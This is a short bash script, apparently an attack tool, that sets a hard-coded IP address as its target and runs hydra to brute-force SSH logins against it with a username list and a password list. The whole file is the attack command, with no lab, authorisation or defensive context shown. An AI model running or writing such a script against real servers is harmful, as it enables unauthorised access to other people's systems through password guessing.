#!/bin/bash
TARGET=123.100.30.1

hydra -L src/namelist.txt -P src/pwdlist.txt -t 4 ssh://$TARGET